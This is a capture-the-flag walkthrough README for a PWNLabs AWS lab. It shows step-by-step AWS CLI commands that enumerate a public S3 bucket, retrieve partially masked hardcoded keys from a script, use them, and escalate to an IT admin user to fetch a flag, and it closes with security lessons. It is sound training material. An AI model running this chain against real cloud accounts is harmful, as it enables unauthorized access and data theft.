# 🛡️ AWS S3 Enumeration Lab – Huge Logistics  

This repository documents the full exploitation chain of a misconfigured Amazon S3 bucket used by the **Huge Logistics** development environment.  
The lab used was a controlled PWNLabs environment — **no real AWS account was used**.

---

## 📌 Overview  
Target website: **http://dev.huge-logistics.com/**  

During enumeration, we discover that the application is backed by an S3 bucket that exposes partial public access.  
By chaining misconfigurations, we escalate from:

**Unauthenticated S3 access → Leaked ZIP archive → Hardcoded AWS credentials → IAM privilege escalation → Admin access**

---

# 🔍 1. Initial Recon – Identify S3 Bucket  

Viewing the webpage source reveals references to S3-hosted assets:

![Source Code Screenshot](screenshots/s3_bucket_1.png)

We identify the bucket name:

```
https://s3.amazonaws.com/dev.huge-logistics.com/
```

---

# 📂 2. Enumerating the S3 Bucket (Unauthenticated)

List root bucket contents:

```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
```

Result:

![AWS CLI Listing](screenshots/s3_bucket_2.png)

We see:

- `static/`
- `shared/`
- `migration-files/`
- `index.html`

Recursive listing fails due to access restrictions:

```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive
```

---

# 🎯 3. Discovering Sensitive Archive in `shared/`

Listing the `shared` folder:

```bash
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
```

![Shared Folder Screenshot](screenshots/s3_bucket_3.png)

We find:

```
hl_migration_project.zip
```

Download it:

```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
```

Unzip:

```bash
unzip hl_migration_project.zip
```

Inside:

```
migrate_secrets.ps1
```

---

# 🔑 4. Hardcoded AWS Credentials Found

Opening the PowerShell script reveals AWS IAM credentials:

![PowerShell Script Screenshot](screenshots/s3_bucket_4.png)

```
AWSAccessKey = "AKIA3SFM********XEHU"
AWSSecretKey = "MwGe3le********************0UFiG83RX/gb9"
AWSRegion    = "us-east-1"
```

These credentials belong to an internal AWS user.

---

# 🌎 5. Confirm Bucket Region

```bash
curl -I https://s3.amazonaws.com/dev.huge-logistics.com/
```

![cURL Screenshot](screenshots/s3_bucket_5.png)

Header confirms:

```
x-amz-bucket-region: us-east-1
```

---

# 🛠️ 6. Configure AWS CLI With Leaked Keys

```bash
aws configure
```

Enter the leaked keys and region `us-east-1`.

---

# 👤 7. Validate IAM Identity

```bash
aws sts get-caller-identity
```

![IAM Identity Screenshot](screenshots/s3_bucket_6.png)

Result shows:

```
arn:aws:iam::794929857501:user/pam-test
```

We now have authenticated access.

---

# 🚀 8. Access Previously Restricted Folders

Now AWS CLI authentication works, so we list restricted paths:

```bash
aws s3 ls s3://dev.huge-logistics.com/migration-files/
```

Download sensitive XML:

```bash
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml .
```

`test-export.xml` contains **an AWS IT Admin credential entry**.

Using these keys allows us to escalate privileges.

---

# 👑 9. Privilege Escalation – Assume IT Admin Role

```bash
aws sts get-caller-identity
```

Output:

```
arn:aws:iam::794929857501:user/it-admin
```

We now have full cloud admin access.

---

# 🚩 10. Retrieve the Flag From the Admin Directory

List admin folder:

```bash
aws s3 ls s3://dev.huge-logistics.com/admin/
```

Download the flag:

```bash
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt .
```

![Flag Screenshot](screenshots/s3_bucket_7.png)

Read it:

```bash
cat flag.txt
```

---

# 🧠 Lessons Learned  

### ✔ Misconfigured S3 buckets expose sensitive internal files  
### ✔ Never store AWS keys in source code or scripts  
### ✔ IAM policies must prevent lateral movement and privilege escalation  
### ✔ Attack chain demonstrates full cloud compromise through S3 + IAM flaws  

---

# 📁 Repository Structure

```
README.md
screenshots/
    s3_bucket_1.png
    s3_bucket_2.png
    s3_bucket_3.png
    s3_bucket_4.png
    s3_bucket_5.png
    s3_bucket_6.png
    s3_bucket_7.png
```

---

# 🏁 Conclusion  

This lab demonstrates how a single misconfigured S3 bucket and poor secret hygiene can lead to an attacker gaining **complete control over a cloud environment**.

---

# 🙌 Credits  
This walkthrough was performed in a **PWNLabs** controlled training environment.

---

